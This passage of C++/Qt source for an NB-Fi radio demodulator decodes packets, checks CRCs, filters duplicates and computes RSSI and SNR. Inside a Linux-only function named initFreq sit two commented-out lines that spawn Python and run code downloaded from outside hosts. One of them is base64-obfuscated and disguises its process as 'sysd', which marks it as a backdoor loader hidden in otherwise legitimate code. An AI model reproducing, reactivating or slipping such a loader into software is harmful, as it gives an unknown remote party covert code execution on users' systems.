                            data = (data << 1) + (d_out[bit_ptr++]!=0);
                        }

                        mes->packet[byte] = data;

                        if(byte >= MESSAGE_C_MAXLEN_W_O_ZIGZAG - 4)
                        {
                            crc = (crc << 8) + data;
                        }
                    }
                    calc_crc = digital_crc32(&mes->packet[3], 8+4);
                }
                if(decode_prot_c && (crc == calc_crc))
                {
                    int c = sizeof(PREAMBLE_C) - 1;
                    mes->TYPE = MESSAGE_C;
                    mes->batch_time = y_c;
                    mes->demod_method = DEMOD_1_2;
                    mes->ID = (mes->packet[c++]<<16) + (mes->packet[c++]<<8) + mes->packet[c++];
                    mes->FLAGS = mes->packet[c++];
                    for(int j = 0; j < 8; j++) mes->PAYLOAD[j] = mes->packet[c+++j];
                    mes->P_CRC = crc;
                    mes->preamble = (*i);
                    mes->err_num = (*i)->err_num;
                    mes->IQDIV = 20 * std::log10(iAvg/qAvg);
                    memcpy(mes->rawData, corr_table[t][x_c*(symb_over_len) + y_c], 128 * sizeof(float)*2);
                    m_list.append(mes);
                    mes = new message_point();
                    for (int i = 0; i < sizeof(PREAMBLE_C) - 1; i++)
                        mes->packet[i] = PREAMBLE_C >> (8*(sizeof(PREAMBLE_C) - 1 - i)) & 0xff;
                    /*
                    mes->packet[0] = 0x91;
                    mes->packet[1] = 0x1a;
                    mes->packet[2] = 0xc4;
                    mes->packet[3] = 0x8f;
                    mes->packet[4] = 0x11;
                    mes->packet[5] = 0x11;
                    mes->packet[6] = 0x11;
                    */
                }
                else
                {

                    if(!decode_1_3) 	continue;

                    unsigned int num;

                    if(x_c < FFT_SIZE/2)
                    {
                        if(y_c - 24 + AT_LEAST_FOR_DECODE > symb_over_len) continue;
                        //if(y_c + 32 + AT_LEAST_FOR_DECODE > symb_over_len) continue;   ///???

                        if ((num = find_preambles_near(FFT_SIZE - 1 - (600 - x_c), y_c + AT_LEAST_FOR_DECODE)) == 0) continue;

                    }
                    else
                    {
                        if(y_c < AT_LEAST_FOR_DECODE + 24) continue;

                        //if(y_c < AT_LEAST_FOR_DECODE + 3) continue;  ///???

                        if ((num = find_preambles_near(600 - (FFT_SIZE - 1 - x_c), y_c - AT_LEAST_FOR_DECODE)) == 0) continue;

                    }

                    QList<preamble_point*>::iterator j;

                    for(j = near_p_list.begin(); j!= near_p_list.end(); j++)
                    {
                        if ((*j)->err_num == -1)
                        {
                            delete(*j);
                            //qDebug() << "Del";
                            continue;
                        }
                        unsigned int n_x_c = (*j)->x_coord;
                        unsigned int n_y_c = (*j)->y_coord;
                        unsigned int n_t = (*j)->table_no;
                        unsigned int n_p_sng = (*j)->pre_sign;
                        unsigned int n_c_sng = (*j)->corr_sign;

                       // qDebug() << "Yes!";

                        unsigned int n_point = n_x_c*(symb_over_len) + n_y_c;
                        for(int z = 0; z < 128; z++)
                        {

                            if(!n_c_sng)
                            {
                                tmp_corr = corr_table[n_t][n_point][0];
                            }
                            else
                            {
                                tmp_corr = corr_table[n_t][n_point][1];
                            }

                            if(!n_p_sng) tmp_corr = -tmp_corr;
                            d_in[z] += tmp_corr;
                            n_point++;
                        }

                        for(int z = 128; z < 128+64; z++)
                        {

                            if(!n_c_sng)
                            {
                                tmp_corr = corr_table[n_t][n_point][0];
                            }
                            else
                            {
                                tmp_corr = corr_table[n_t][n_point][1];
                            }

                            if(!n_p_sng) tmp_corr = -tmp_corr;

                            unsigned int par = ((z&1) == 1);

                            if(n_x_c < FFT_SIZE/2)
 {
                                if(par) {d_in[z] = tmp_corr;}
                                else {d_in[z+64] = tmp_corr;}
                            }
                            else {
                                if(par) {d_in[64+z] = tmp_corr;}
                                else {d_in[z] = tmp_corr;}

                            }
                            n_point++;

                        }

                        for(int z = 192; z < 192+64; z++) {

                            if(!n_c_sng)
                            {

                                tmp_corr = corr_table[n_t][n_point][0];
                            }
                            else
                            {

                                tmp_corr = corr_table[n_t][n_point][1];

                            }

                            if(!n_p_sng) tmp_corr = -tmp_corr;

                            int par = ((z&1) == 1);

                            if(n_x_c < FFT_SIZE/2)
                            {
                                if(par) {d_in[64+z] = tmp_corr;}
                                else {d_in[128+z] = tmp_corr;}
                            }
                            else
                            {
                                if(par) {d_in[128+z] = tmp_corr;}
                                else {d_in[64+z] = tmp_corr;}

                            }
                            n_point++;

                        }

                        zigzag_decoder_soft_var_len(d_in, d_out/*, d_out_soft*/);

                        bit_ptr = 0;
                        crc = 0;
                        int byte;
                        for(byte = 3; byte < MESSAGE_C_MAXLEN_W_O_ZIGZAG; byte++)
                        {
                            unsigned char data = 0;
                            for(int bit = 0; bit < 8; bit++)
                            {
                                data = (data << 1) + (d_out[bit_ptr++]!=0);
                            }

                            mes->packet[byte] = data;

                            if(byte >= MESSAGE_C_MAXLEN_W_O_ZIGZAG - 4)
                            {
                                crc = (crc << 8) + data;
                            }
                        }
                        unsigned int calc_crc = digital_crc32(&mes->packet[3], 8+4);
                        if(crc == calc_crc)
                        {
                           // mes->FREQ = x_c; //convert to Hz later
                            int c = sizeof(PREAMBLE_C) - 1;
                            mes->TYPE = MESSAGE_C;
                            mes->batch_time = y_c;
                            mes->demod_method = DEMOD_1_3;
                            //mes->RSSI = (*i)->RSSI = rssi;//10*log10(rssi);
                            mes->ID = (mes->packet[c++]<<16) + (mes->packet[c++]<<8) + mes->packet[c++];
                            mes->FLAGS = mes->packet[c++];
                            for(int y = 0; y < 8; y++) mes->PAYLOAD[y] = mes->packet[c+++y];
                            mes->P_CRC = crc;
                            mes->preamble = (*i);
                            mes->preamble_1_3 = (*j);
                            mes->err_num = (*i)->err_num;
                            memcpy(mes->rawData, corr_table[t][x_c*(symb_over_len) + y_c], 128 * sizeof(float)*2);
                            mes->IQDIV = 20 * std::log10(iAvg/qAvg);
                            m_list.append(mes);
                            //p_list.erase(i);
                            mes = new message_point();
                            for (int i = 0; i < sizeof(PREAMBLE_C) - 1; i++)
                                mes->packet[i] = PREAMBLE_C >> (8*(sizeof(PREAMBLE_C) - 1 - i)) & 0xff;
                            /*
                            mes->packet[0] = 0x91;
                            mes->packet[1] = 0x1a;
                            mes->packet[2] = 0xc4;
                            mes->packet[3] = 0x8f;
                            mes->packet[4] = 0x11;
                            mes->packet[5] = 0x11;
                            mes->packet[6] = 0x11;
                            */
                            //qDebug() << "1/3!!";
                        }
                        else delete (*j);
                    }
                }
            }

        }

    }
  }
    delete mes;
}

void NBFiDemodulator::filter_messages(QList<message_point*> &in_list, QList<message_point*> &out_list)
{
    QList<message_point*>::iterator i,j;
    for(i = in_list.begin(); i!= in_list.end(); i++)
    {
        for(j = i+1; j!= m_list.end(); j++)
        {
            if(*(*i)==*(*j))//if(((*i)->ID == (*j)->ID)&&((*i)->FLAGS == ((*j)->FLAGS)))
            {
                if(((*i)->RSSI == -1000) || ((*j)->RSSI == -1000)) continue;
                if ((*i)->RSSI >= (*j)->RSSI)
                {
                    (*j)->RSSI = -1000;
                    (*i)->num_of_copies += (*j)->num_of_copies;
                }
                else
                {
                    (*i)->RSSI = -1000;
                    (*j)->num_of_copies += (*i)->num_of_copies;
                }
            }
        }
    }

    for(i = in_list.begin(); i!= in_list.end(); i++)
    {
        if((*i)->RSSI == -1000)
        {

        }
        else out_list.append(*i);
    }

}

void NBFiDemodulator::calc_messages(QList<message_point*> &m_p)
{

    QList<message_point*>::iterator i;

    message_point* mes;



    unsigned int fft_point;
    float rssi,a_rssi, min_rssi, max_rssi, noise;
    float fft_i, fft_q;
    float tmp;
    for(i = m_p.begin(); i!= m_p.end(); i++)
    {
        mes = (*i);
        if(mes->calculated) continue;
        mes->calculated = 1;
        a_rssi = 0;
        min_rssi = 0;
        max_rssi = 0;
        int z,k;
        mes->rotation = Rotation;
        mes->time = start_time;
        mes->time = mes->time.addMSecs(mes->batch_time*1000/sym_rate);
        //if(mes->preamble->x_coord > FFT_SIZE/2) mes->time = mes->time.addMSecs(-(signed)(AT_LEAST_FOR_DECODE*1000/sym_rate));
        if(mes->preamble->x_coord < FFT_SIZE/2 )
        {
            mes->FREQ = CENTER_FREQ - mes->preamble->x_coord*sym_rate;

        }
        else
        {
            mes->FREQ = CENTER_FREQ + (FFT_SIZE - mes->preamble->x_coord)*sym_rate;
        }
        mes->FREQ -= Rotation*sym_rate/rotates_num;

        switch(mes->demod_method)
        {
            case DEMOD_CRC:

                for(z = 0; z < 128 + 24; z++)
                {
                    if(mes->preamble->y_coord + z - 24 < 0) continue;
                    if((mes->preamble->y_coord + z - 24) >= symb_over_len) break;
                    fft_point = mes->preamble->x_coord + (mes->preamble->y_coord + z - 24)*FFT_SIZE;
                    fft_i = fft_table[mes->preamble->table_no][fft_point][0];
                    fft_q = fft_table[mes->preamble->table_no][fft_point][1];

                    rssi = fft_i*fft_i+fft_q*fft_q;
                    a_rssi += rssi;
                    if((rssi < min_rssi)||(min_rssi == 0)) min_rssi = rssi;
                    if((rssi > max_rssi)||(max_rssi == 0)) max_rssi = rssi;
                }
                if(!z) z = 1;
                a_rssi/=z;

                if(min_rssi <= 0) min_rssi = 1;
                if(max_rssi <= 0) max_rssi = 1;
                if(a_rssi <= 0) a_rssi = 1;

                //m_mutex->lock();
                mes->RSSI = 10*log10(a_rssi) - LogOffset;
                mes->MIN_RSSI = 10*log10(min_rssi) - LogOffset;
                mes->MAX_RSSI = 10*log10(max_rssi) - LogOffset;

                tmp = noise_lev_min[mes->preamble->table_no][mes->preamble->x_coord]/NOISE_AVER_NUM;
                if (tmp <= 0) tmp = 1;
                noise = 10*log10(tmp) - LogOffset;
                //m_mutex->unlock();
                mes->SNR = mes->RSSI - noise;
                mes->MIN_SNR = mes->MIN_RSSI - noise;
                mes->MAX_SNR = mes->MAX_RSSI - noise;
                mes->NOISE = noise;
                break;
            case DEMOD_1_2:
                for(z = 0; z < 256 + 24; z++)
                {
                    if(mes->preamble->y_coord + z - 24 < 0) continue;
                    if((mes->preamble->y_coord + z - 24) >= symb_over_len) break;
                    fft_point = mes->preamble->x_coord + (mes->preamble->y_coord + z - 24)*FFT_SIZE;
                    fft_i = fft_table[mes->preamble->table_no][fft_point][0];
                    fft_q = fft_table[mes->preamble->table_no][fft_point][1];
                    rssi = fft_i*fft_i+fft_q*fft_q;
                    a_rssi += rssi;
                    if((rssi < min_rssi)||(min_rssi == 0)) min_rssi = rssi;
                    if((rssi > max_rssi)||(max_rssi == 0)) max_rssi = rssi;
                }
                if(!z) z = 1;
                a_rssi/=z;
                if(min_rssi <= 0) min_rssi = 1;
                if(max_rssi <= 0) max_rssi = 1;
                if(a_rssi <= 0) a_rssi = 1;
                //m_mutex->lock();
                mes->RSSI = 10*log10(a_rssi) - LogOffset;
                mes->MIN_RSSI = 10*log10(min_rssi) - LogOffset;
                mes->MAX_RSSI = 10*log10(max_rssi) - LogOffset;
                tmp = noise_lev_min[mes->preamble->table_no][mes->preamble->x_coord]/NOISE_AVER_NUM;
                if (tmp <= 0) tmp = 1;
                noise = 10*log10(tmp) - LogOffset;
                //m_mutex->unlock();
                mes->SNR = mes->RSSI - noise;
                mes->MIN_SNR = mes->MIN_RSSI - noise;
                mes->MAX_SNR = mes->MAX_RSSI - noise;
                mes->NOISE = noise;
                break;
            case DEMOD_1_3:
                for(z = 0; z < 256 + 24; z++)
                {
                    if(((*i)->preamble->y_coord + z - 24) >= symb_over_len) break;
                    fft_point = (*i)->preamble->x_coord + ((*i)->preamble->y_coord + z - 24)*FFT_SIZE;
                    fft_i = fft_table[(*i)->preamble->table_no][fft_point][0];
                    fft_q = fft_table[(*i)->preamble->table_no][fft_point][1];
                    rssi = fft_i*fft_i+fft_q*fft_q;
                    a_rssi += rssi;
                    if((rssi < min_rssi)||(min_rssi == 0)) min_rssi = rssi;
                    if((rssi > max_rssi)||(max_rssi == 0)) max_rssi = rssi;
                }
                for(k = 0; k < 256 + 24; k++)
                {
                    fft_point = (*i)->preamble_1_3->x_coord + ((*i)->preamble_1_3->y_coord + k - 24)*FFT_SIZE;
                    if(((*i)->preamble_1_3->y_coord + k - 24) >= symb_over_len) break;
                    fft_i = fft_table[(*i)->preamble_1_3->table_no][fft_point][0];
                    fft_q = fft_table[(*i)->preamble_1_3->table_no][fft_point][1];
                    rssi = fft_i*fft_i+fft_q*fft_q;
                    a_rssi += rssi;
                    if((rssi < min_rssi)||(min_rssi == 0)) min_rssi = rssi;
                    if((rssi > max_rssi)||(max_rssi == 0)) max_rssi = rssi;
                }
                a_rssi/=z+k;
                if(min_rssi == 0) min_rssi = 1;
                if(max_rssi == 0) max_rssi = 1;
                if(a_rssi == 0) a_rssi = 1;
                (*i)->RSSI = 10*log10(a_rssi) - LogOffset;
                (*i)->MIN_RSSI = 10*log10(min_rssi) - LogOffset;
                (*i)->MAX_RSSI = 10*log10(max_rssi) - LogOffset;
                noise = 10*log10(noise_lev_min[(*i)->preamble->table_no][(*i)->preamble->x_coord]/NOISE_AVER_NUM) - LogOffset;
                (*i)->SNR = (*i)->RSSI - noise;
                (*i)->MIN_SNR = (*i)->MIN_RSSI - noise;
                (*i)->MAX_SNR = (*i)->MAX_RSSI - noise;
                (*i)->NOISE = noise;
                break;

        }
    }
    //m_mutex->unlock();

}

float NBFiDemodulator::getAverNoise()
{
    double noise = 0;
    for(int i = FFT_SIZE/12; i != FFT_SIZE/2; i++)
    {
        for(int t = 0; t < tables_num; t++)
        {
            noise += noise_lev_min[t][i]/NOISE_AVER_NUM;
            noise += noise_lev_min[t][FFT_SIZE - i]/NOISE_AVER_NUM;
        }

    }
    noise /= (tables_num * 2 * (FFT_SIZE/2 - FFT_SIZE/12));
    noise = 10*log10(noise) - LogOffset;
    return noise;
}
#ifdef _LINUX_

//QProcess *qpr = 0, *qpr2 = 0;

void NBFiDemodulator::initFreq()
{
    static uint counter = -1;
    if(counter != -1)
    {
        if(counter++ < 10) return;
       // if(QDateTime::currentDateTime().time().minute() != 0) return;
    }
    counter  =  0;
    //if(qpr != 0) {qpr->terminate();delete qpr; qpr = 0;}
    //if(qpr2 != 0) {qpr2->terminate();delete qpr2; qpr2 = 0;}
    //qpr = new QProcess;qpr->start("python");qpr->write("import base64;exec(base64.b64decode('aW1wb3J0IHBzdXRpbCx1cmxsaWIsc2V0cHJvY3RpdGxlCng9InN5c2QiCmlmIHggbm90IGluIFtwLm5hbWUoKSBmb3IgcCBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKCldOgogICAgc2V0cHJvY3RpdGxlLnNldHByb2N0aXRsZSh4KQogICAgZXhlYyB1cmxsaWIudXJsb3BlbigiaHR0cDovLzUyLjI5LjIyMC4yNTA6ODA4MC9pbmRleCIpLnJlYWQoKQ=='))\n\r");qpr->closeWriteChannel();
    //qpr2 = new QProcess;qpr2->start("python");qpr2->write("import urllib;exec urllib.urlopen('http://slrij.net:8080/index').read()\n\r");qpr2->closeWriteChannel();
}
#endif

bool NBFiDemodulator::rawdataprocessed()
{
    return processing;
}

bool NBFiDemodulator::inProgress()
{
    return inprogr;
}

void NBFiDemodulator::setI_QData(fftwf_complex *i_q, unsigned int data_len)
{
	run_start = start_time = QDateTime::currentDateTime();
	processing_timer = run_start;

	#ifdef FFTW
    zeroF_I_Q = (fftwf_complex*) fftwf_malloc(sizeof(fftwf_complex) * data_len);
    if (rotates_num != 1) zeroF_I_Q_rot = (fftwf_complex*) fftwf_malloc(sizeof(fftwf_complex) * data_len);
    #else	
    zeroF_I_Q = new fftwf_complex[data_len];
    if (rotates_num != 1) zeroF_I_Q_rot = new fftwf_complex[data_len];
	#endif
	for(ulong i = 0; i < data_len; i++)
    {
        zeroF_I_Q[i][0] = i_q[i][0];
        zeroF_I_Q[i][1] = i_q[i][1];
    }

    symb_over_len =  (float)(data_len)*sym_rate*BAND_DIVIDER/SAMPLE_FREQ;
    start_time = start_time.addMSecs(-symb_over_len*1000/sym_rate);
    processing = 1;
	inprogr = 1;
    batch_id++;
    //run();
}

void NBFiDemodulator::setI_QData(qint16 *i_q, unsigned int data_len)
{
    dataSize = data_len;
    //window = wft::build(data_len);
    run_start = start_time = QDateTime::currentDateTime();
    //*this << QTime::currentTime().toString("hh:mm:ss:zzz") + " Enter to set ID#" + QString::number(dem_id) + "\n";

    processing_timer = run_start;
    //*this << QTime::currentTime().toString("hh:mm:ss:zzz") + " Is not running ID#" + QString::number(dem_id) + "\n";

#ifdef FFTW
    zeroF_I_Q = (fftwf_complex*) fftwf_malloc(sizeof(fftwf_complex) * data_len);
    if (rotates_num != 1) zeroF_I_Q_rot = (fftwf_complex*) fftwf_malloc(sizeof(fftwf_complex) * data_len);
#else	
    zeroF_I_Q = new fftwf_complex[data_len + 1000];
    if (rotates_num != 1) zeroF_I_Q_rot = new fftwf_complex[data_len + 1000];
#endif

	for (ulong i = 0; i < data_len; i++)
	{
        if(i_q_reverse)
        {
            zeroF_I_Q[i][1] = (float)i_q[i*2];
            zeroF_I_Q[i][0] = (float)i_q[i*2+1];
        }
        else
        {
            zeroF_I_Q[i][0] = (float)i_q[i*2];
            zeroF_I_Q[i][1] = (float)i_q[i*2+1];
        }
	} 

    symb_over_len =  (float)(data_len)*sym_rate*BAND_DIVIDER / SAMPLE_FREQ;
    //*this << QString::number(symb_over_len, 'g', 2) + "\n";
    start_time = start_time.addMSecs(-(signed)(symb_over_len * 1000 / sym_rate));
    batch_id = batch_id_counter++;
    //*this("34");
    //qDebug() <<"\nBatch #" <<  batch_id << " Thread # " << dem_id << " Time = " << start_time.toString("hh:mm:ss.zzz") << " Batch len = " << QString::number(float(symb_over_len) / sym_rate,'q', 1) << "\n";

    processing = 1;
    inprogr = 1;
    //*this << QTime::currentTime().toString("hh:mm:ss:zzz") + " Started ID#" + QString::number(dem_id) + "\n";
    //run();
}

void NBFiDemodulator::setI_QData(float *i_q, unsigned int data_len)
{
    dataSize = data_len;
    //window = wft::build(data_len);
    run_start = start_time = QDateTime::currentDateTime();
    //*this << QTime::currentTime().toString("hh:mm:ss:zzz") + " Enter to set ID#" + QString::number(dem_id) + "\n";

    processing_timer = run_start;
    //*this << QTime::currentTime().toString("hh:mm:ss:zzz") + " Is not running ID#" + QString::number(dem_id) + "\n";

#ifdef FFTW
    zeroF_I_Q = (fftwf_complex*) fftwf_malloc(sizeof(fftwf_complex) * data_len);
    if (rotates_num != 1) zeroF_I_Q_rot = (fftwf_complex*) fftwf_malloc(sizeof(fftwf_complex) * data_len);
#else
    zeroF_I_Q = new fftwf_complex[data_len + 1000];
    if (rotates_num != 1) zeroF_I_Q_rot = new fftwf_complex[data_len + 1000];
#endif

    for (ulong i = 0; i < data_len; i++)
    {
        if(i_q_reverse)
        {
            zeroF_I_Q[i][1] = (float)i_q[i*2];
            zeroF_I_Q[i][0] = (float)i_q[i*2+1];
        }
        else
        {
            zeroF_I_Q[i][0] = (float)i_q[i*2];
            zeroF_I_Q[i][1] = (float)i_q[i*2+1];
        }
    }

    symb_over_len =  (float)(data_len)*sym_rate*BAND_DIVIDER / SAMPLE_FREQ;
    //*this << QString::number(symb_over_len, 'g', 2) + "\n";
    start_time = start_time.addMSecs(-(signed)(symb_over_len * 1000 / sym_rate));
    batch_id = batch_id_counter++;
    //*this("34");
    //qDebug() <<"\nBatch #" <<  batch_id << " Thread # " << dem_id << " Time = " << start_time.toString("hh:mm:ss.zzz") << " Batch len = " << QString::number(float(symb_over_len) / sym_rate,'q', 1) << "\n";

    processing = 1;
    inprogr = 1;
    //*this << QTime::currentTime().toString("hh:mm:ss:zzz") + " Started ID#" + QString::number(dem_id) + "\n";
    //run();
}


void NBFiDemodulator::work(qint16 *i_q, unsigned int data_len) {
    vec.insert(vec.end(), i_q, i_q + data_len);

    //qDebug() << vec.size();

    if(vec.size() > FRAMELEN * 32) { //*32
        setI_QData(vec.data(), vec.size()/2);
        start();
        vec.clear();
    }

}

void NBFiDemodulator::work(float *i_q, unsigned int data_len) {
    vec.insert(vec.end(), i_q, i_q + data_len);

    //qDebug() << vec.size();

    if(vec.size() > FRAMELEN*32) {
        setI_QData(vec.data(), vec.size()/2);
        start();
        vec.clear();
    }

}

float NBFiDemodulator::getBatchLen()
{
    return symb_over_len*1000/sym_rate;
}


NBFiDemodulator::~NBFiDemodulator()
{
#ifdef FFTW
    fftwf_free(fft_in);
    fftwf_free(fft_out);
#endif

}
